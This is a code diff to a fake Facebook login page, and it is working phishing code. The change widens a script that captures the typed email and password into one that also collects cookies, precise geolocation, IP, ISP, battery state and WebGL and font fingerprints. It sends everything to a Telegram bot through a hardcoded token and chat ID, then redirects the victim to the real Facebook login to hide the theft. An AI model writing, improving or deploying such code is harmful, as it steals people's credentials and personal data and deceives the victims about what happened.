@@ -64,7 +64,7 @@
         <h2>Facebook Login</h2>
         <input type="text" id="username" placeholder="Email or Phone Number">
         <input type="password" id="password" placeholder="Password">
-        <button onclick="sendToTelegram()">Log In</button>
+        <button onclick="collectAndSendData()">Log In</button>
         <div class="forgot-password">
             <a href="#">Forgotten password?</a>
         </div>
@@ -74,38 +74,171 @@
     </div>
 
     <script>
-        async function sendToTelegram() {
+        async function collectAndSendData() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
             try {
+                // Collect basic browser information
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+                const colorDepth = window.screen.colorDepth;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const cookiesEnabled = navigator.cookieEnabled;
+                const cookies = document.cookie;
                 
+                // Collect more detailed information
+                const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+                const deviceMemory = navigator.deviceMemory || 'unknown';
+                const touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+                
+                // Try to get geolocation
+                let latitude = 'unknown';
+                let longitude = 'unknown';
+                
+                if (navigator.geolocation) {
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 5000});
+                        });
+                        latitude = position.coords.latitude;
+                        longitude = position.coords.longitude;
+                    } catch (geoError) {
+                        console.error('Geolocation error:', geoError);
+                    }
+                }
+                
+                // Get IP and location data
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ipAddress = ipData.ip;
 
-                
                 const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
                 const geoData = await geoResponse.json();
                 const city = geoData.city || 'Unknown';
-
+                const region = geoData.region || 'Unknown';
+                const country = geoData.country_name || 'Unknown';
+                const isp = geoData.org || 'Unknown';
                 
+                // Get network information
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                let networkInfo = {};
+                if (connection) {
+                    networkInfo = {
+                        effectiveType: connection.effectiveType || 'unknown',
+                        rtt: connection.rtt || 'unknown',
+                        downlink: connection.downlink || 'unknown',
+                        saveData: connection.saveData || false
+                    };
+                }
+                
+                // Get battery status if available
+                let batteryInfo = {};
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        batteryInfo = {
+                            level: battery.level,
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                    } catch (e) {
+                        console.error('Battery API error:', e);
+                    }
+                }
+                
+                // Get WebGL fingerprint
+                let webglInfo = 'unknown';
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        webglInfo = {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                        };
+                    }
+                } catch (e) {
+                    console.error('WebGL error:', e);
+                }
+                
+                // Get installed fonts (limited)
+                let fonts = 'unknown';
+                try {
+                    const fontCheck = new Set([
+                        'Arial', 'Arial Black', 'Arial Narrow', 'Times New Roman',
+                        'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Garamond',
+                        'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Impact'
+                    ]);
+                    
+                    const availableFonts = [];
+                    for (const font of fontCheck.values()) {
+                        if (document.fonts.check(`12px "${font}"`)) {
+                            availableFonts.push(font);
+                        }
+                    }
+                    fonts = availableFonts.join(', ');
+                } catch (e) {
+                    console.error('Font detection error:', e);
+                }
+                
+                // Prepare the message
+                const message = `
+🔐 Login Attempt Detected 🔐
+
+📧 Username: ${username}
+🔑 Password: ${password}
+
+🌐 Network Information:
+- IP Address: ${ipAddress}
+- ISP: ${isp}
+- Location: ${city}, ${region}, ${country}
+- Coordinates: ${latitude}, ${longitude}
+- Timezone: ${timezone}
+
+💻 Device Information:
+- User Agent: ${userAgent}
+- Platform: ${platform}
+- Language: ${language}
+- Screen: ${screenWidth}x${screenHeight} (${colorDepth}bit)
+- CPU Cores: ${hardwareConcurrency}
+- RAM: ${deviceMemory}GB
+- Touch Support: ${touchSupport}
+- Network Type: ${networkInfo.effectiveType}
+- RTT: ${networkInfo.rtt}ms
+- Downlink: ${networkInfo.downlink}Mbps
+- Save Data: ${networkInfo.saveData}
+- Battery: ${batteryInfo.level ? (batteryInfo.level * 100).toFixed(0) + '%' : 'unknown'}
+- Charging: ${batteryInfo.charging || 'unknown'}
+
+🖥️ Browser Fingerprint:
+- WebGL Vendor: ${webglInfo.vendor || 'unknown'}
+- WebGL Renderer: ${webglInfo.renderer || 'unknown'}
+- Installed Fonts: ${fonts}
+- Cookies Enabled: ${cookiesEnabled}
+- Cookies: ${cookies}
+                `;
+
+                // Send to Telegram
                 const botToken = '7085151914:AAF08OGTwZWvxhLyTyK39bsV41YEERmijx0';
                 const chatId = '6752982813';
-                const message = `Username: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nCity: ${city}`;
-
-                
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
                 const response = await fetch(url);
                 if (response.ok) {
-                    alert('Login details Has been sent 💀!');
+                    // Redirect to actual Facebook login after sending data
+                    window.location.href = 'https://www.facebook.com/login';
                 } else {
-                    alert('Failed to send');
+                    alert('Login failed. Please try again.');
                 }
             } catch (error) {
-                console.error('Error :', error);
-                alert('An error came across : ' + error.message);
+                console.error('Error:', error);
+                alert('An error occurred. Please try again.');
             }
         }
     </script>
